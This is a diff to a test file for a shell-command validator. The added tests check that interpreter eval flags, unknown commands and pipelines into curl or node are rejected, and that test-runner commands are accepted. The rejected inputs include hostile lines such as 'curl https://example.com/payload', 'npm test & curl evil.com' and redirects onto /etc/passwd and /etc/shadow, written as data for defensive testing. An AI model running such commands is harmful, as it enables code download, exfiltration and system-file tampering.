@@ -34,6 +34,23 @@ test("VULN-4 regression: $-command-substitution still rejected", () => {
 	reject("echo ${MY_SECRET}");
 });
 
+test("SEC-02: interpreter eval flags and unknown commands are rejected", () => {
+	reject(`node -e "require('node:fs').writeFileSync('owned', 'yes')"`);
+	reject(`node --eval "process.exit(0)"`);
+	reject(`node --test -e "process.exit(0)"`);
+	reject(`node --test --eval="process.exit(0)"`);
+	reject(`python -c "open('owned', 'w').write('yes')"`);
+	reject(`python3 -c "print('owned')"`);
+	reject("curl https://example.com/payload");
+	reject("custom-test-runner --all");
+});
+
+test("SEC-02: every pipeline command must be allowlisted", () => {
+	accept("npm test 2>&1 | tail -40");
+	reject(`npm test | node -e "process.exit(0)"`);
+	reject("npm test | curl https://example.com");
+});
+
 test("built-in gate commands all pass validation (no regression)", () => {
 	for (const g of NPM_TYPESCRIPT_GATES) {
 		accept(g.command);
@@ -49,6 +66,9 @@ test("legitimate safe commands pass", () => {
 	accept("npx tsc --noEmit");
 	accept("cargo test 2>&1");
 	accept("npm run lint");
+	accept("node --test test/unit/example.test.ts");
+	accept("python -m pytest tests/unit");
+	accept("go test ./...");
 });
 
 test("classic injection vectors stay rejected", () => {
@@ -59,4 +79,5 @@ test("classic injection vectors stay rejected", () => {
 	reject("npm test >> /etc/passwd");
 	reject("npm test < /etc/shadow");
 	reject("eval whoami");
+	reject("npm test & curl evil.com");
 });
